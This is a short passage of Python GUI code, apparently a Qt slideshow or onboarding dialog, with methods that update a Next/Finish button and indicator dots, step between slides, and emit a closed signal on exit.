        self._next_btn.setText("Finish  ✓" if is_last else "Next  ▶")

        for i, dot in enumerate(self._dots):
            dot.setStyleSheet(f"color: {self.accent if i == index else '#334155'}; background: transparent;")

    def _next_slide(self):
        if self.current_index < len(self.slides) - 1:
            self._show_slide(self.current_index + 1)
        else:
            self._on_close()

    def _prev_slide(self):
        self._show_slide(self.current_index - 1)

    def _on_close(self):
        self.closed.emit()
        self.close()